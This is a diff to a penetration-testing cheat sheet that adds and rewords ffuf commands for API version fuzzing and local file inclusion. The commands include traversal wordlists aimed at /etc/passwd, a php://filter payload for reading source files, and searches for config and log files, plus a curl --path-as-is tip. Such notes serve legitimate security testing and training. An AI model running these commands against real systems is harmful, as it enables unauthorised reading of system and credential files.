@@ -151,8 +151,8 @@ curl http://<TARGET>/<PAGE> -H 'Content-Type: application/x-www-form-urlencoded'
 ### API Fuzzing
 
 ```bash
-# Fuzz multiple versions (v1, v2, v3) at once
-ffuf -w /usr/share/wordlists/dirb/big.txt:ENDPOINT -w <(printf 'v1\nv2\nv3\n'):VERSION -u 'http://<TARGET>:<PORT>/ENDPOINT/VERSION' \     
+# Fuzz multiple versions ('', v1, v2, v3) at once
+ffuf -w /usr/share/wordlists/dirb/big.txt:ENDPOINT -w <(printf '\nv1\nv2\nv3\n'):VERSION -u 'http://<TARGET>:<PORT>/ENDPOINT/VERSION' \     
 ```
 
 ## LFI
@@ -161,17 +161,19 @@ Fuzzes a parameter with hundreds of `/etc/passwd` traversal permutations includi
 
 ### Linux
 
-**Tests many types of bypasses (nested, encoded, null bytes):**
+**NOTE:** if using `curl` to retrieve a file, oftentimes the option `--path-as-is` is needed so that `curl` does **NOT** strip out the LFI portion
+
+**Tests MANY bypasses (nested, encoded, null bytes):**
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=FUZZ' -fs <SIZE>
 ```
 
-**For when files are executed instead of being read:**
+**For FILE EXECUTION instead of only READ:**
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=php://filter/read=convert.base64-encode/resource=FUZZ' -fs <SIZE>
 ```
 
-**Once confirmed, fuzz for accessible config files, logs, and sensitive paths:**
+**Afterwards, FIND config files, logs, and sensitive paths:**
 ```bash
 # NOTE: <LFI_TRAVERSAL> is not always needed
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=<LFI_TRAVERSAL>FUZZ' -fs 0 -v
